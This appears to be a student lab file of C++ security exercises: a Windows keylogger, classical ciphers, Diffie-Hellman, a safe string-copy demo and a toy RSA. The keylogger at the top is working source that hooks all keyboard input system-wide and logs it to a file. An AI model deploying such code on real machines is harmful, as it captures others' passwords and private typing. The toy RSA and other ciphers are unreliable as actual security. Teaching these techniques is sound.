# CS-exp

# keyloggers
#include <iostream>
#include <Windows.h> //Windows API: to capture keystrokes
#include <fstream>   //File handling: to write keystrokes into a log file

// Function to log keystrokes into a file
void logKeyStroke(int key)
{
    std::ofstream logfile;                     // ofstream object to handle file writing
    logfile.open("keylog.txt", std::ios::app); // Open the log file in append mode

    if (key == VK_BACK)
        logfile << "[BACKSPACE]";

    else if (key == VK_RETURN)
    {
        logfile << "[ENTER]\n";
    }
    else if (key == VK_OEM_COMMA)
    {
        logfile << ",";
    }
    else if (key == VK_OEM_PERIOD)
    {
        logfile << ".";
    }
    else if (key == VK_SPACE)
    {
        logfile << " ";
    }
    else if (key >= 'A' && key <= 'Z')
    {
        logfile << static_cast<char>(key);
    }
    else if (key >= 'a' && key <= 'z')
    {
        logfile << static_cast<char>(key);
    }
    else if (key >= '0' && key <= '9')
    {
        logfile << static_cast<char>(key);
    }

    logfile.close();
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0 && wParam == WM_KEYDOWN)
    {
        KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
        int key = pKeyBoard->vkCode;
        logKeyStroke(key);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main()
{

    HHOOK keyBoardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0); // Set the hook

    MSG msg;

    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(keyBoardHook);

    return 0;
}













# ceaser cipher 
#include <iostream>
#include <string>
using namespace std;

int main()
{
    string msg;
    int shift;

    cout << "Enter the message: ";
    getline(cin, msg);

    cout << "Enter the shift value: ";
    cin >> shift;

    for (int i = 0; i < msg.length(); i++)
    {
        char c = msg[i];

        if (c >= 'A' && c <= 'Z')
        {
            msg[i] = ((c - 'A' + shift) % 26) + 'A';
        }
        else if (c >= 'a' && c <= 'z')
        {
            msg[i] = ((c - 'a' + shift) % 26) + 'a';
        }
    }

    cout << "Encrypted message: " << msg << endl;
    return 0;
}















# rail fencinf

#include <iostream>
#include <string>
using namespace std;

string encryptRailFence(string text, int key)
{
    string result = "";
    int len = text.length();

    char rail[key][len];

    for (int i = 0; i < key; i++)
        for (int j = 0; j < len; j++)
            rail[i][j] = '\n';

    bool down = false;
    int row = 0, col = 0;

    for (int i = 0; i < len; i++)
    {
        rail[row][col++] = text[i];

        if (row == 0 || row == key - 1)
            down = !down;

        row += down ? 1 : -1;
    }

    for (int i = 0; i < key; i++)
        for (int j = 0; j < len; j++)
            if (rail[i][j] != '\n')
                result.push_back(rail[i][j]);

    return result;
}

int main()
{
    string text;
    int key;

    cout << "Enter message: ";
    getline(cin, text);
    cout << "Enter number of rails: ";
    cin >> key;

    string cipher = encryptRailFence(text, key);
    cout << "\nEncrypted text: " << cipher << endl;

    return 0;
}











#simple columnar
#include <iostream>
#include <string>
using namespace std;

string encryptColumnar(string text, int key)
{
    string cipher = "";
    int len = text.length();

    for (int col = 0; col < key; col++)
    {
        for (int row = col; row < len; row += key)
        {
            cipher += text[row];
        }
    }
    return cipher;
}

int main()
{
    string text;
    int key;

    cout << "Enter message: ";
    getline(cin, text);
    cout << "Enter key (number of columns): ";
    cin >> key;

    string cipher = encryptColumnar(text, key);

    cout << "\nEncrypted text: " << cipher << endl;

    return 0;
}




















#DH
#include <iostream>
#include <cmath>
using namespace std;

long long modPow(long long base, long long exponent, long long mod)
{
    long long result = 1;
    base = base % mod;
    while (exponent > 0)
    {
        if (exponent % 2 == 1)
            result = (result * base) % mod;
        exponent = exponent >> 1;
        base = (base * base) % mod;
    }
    return result;
}

int main()
{
    long long p, g;
    long long a, b;

    cout << "Enter a prime number (p): ";
    cin >> p;
    cout << "Enter a primitive root (g): ";
    cin >> g;

    cout << "Enter private key for Scout: ";
    cin >> a;
    cout << "Enter private key for Tenz: ";
    cin >> b;

    long long A = modPow(g, a, p);
    long long B = modPow(g, b, p);

    cout << "\nPublic Key of Scout: " << A << endl;
    cout << "Public Key of Tenz: " << B << endl;

    long long keyA = modPow(B, a, p);
    long long keyB = modPow(A, b, p);

    cout << "\nShared Secret Key computed by Scout: " << keyA << endl;
    cout << "Shared Secret Key computed by Tenz: " << keyB << endl;

    if (keyA == keyB)
        cout << "\nKey exchange successful! Both users have the same secret key." << endl;
    else
        cout << "\nError: Keys do not match!" << endl;

    return 0;
}























#buffer
#include <iostream>
#include <string>
#include <cstring>
using namespace std;
int main()
{
    char buf[4];
    string s;
    cout << "Enter a long word: ";
    getline(cin, s);
    strncpy(buf, s.c_str(), sizeof(buf) - 1);
    buf[sizeof(buf) - 1] = '\0';
    cout << "You typed: " << buf << endl;
    return 0;
}


















#RSA
#include <iostream>
#include <cmath>
using namespace std;

long long powerMod(long long base, long long exp, long long mod)
{
    long long result = 1;
    base = base % mod;
    while (exp > 0)
    {
        if (exp % 2 == 1)
            result = (result * base) % mod;
        exp = exp / 2;
        base = (base * base) % mod;
    }
    return result;
}

long long gcd(long long a, long long b)
{
    return (b == 0) ? a : gcd(b, a % b);
}

int main()
{
    long long p = 101, q = 113;
    long long n = p * q;
    long long phi = (p - 1) * (q - 1);

    long long e = 17;
    if (gcd(e, phi) != 1)
    {
        cout << "Choose a different e!" << endl;
        return 0;
    }

    long long d;
    for (d = 1; d < phi; d++)
    {
        if ((d * e) % phi == 1)
            break;
    }

    cout << "Public Key: (" << e << ", " << n << ")" << endl;
    cout << "Private Key: (" << d << ", " << n << ")" << endl;

    long long message;
    cout << "\nEnter message (number): ";
    cin >> message;

    long long cipher = powerMod(message, e, n);
    cout << "Encrypted message: " << cipher << endl;

    long long decrypted = powerMod(cipher, d, n);
    cout << "Decrypted message: " << decrypted << endl;

    return 0;
}
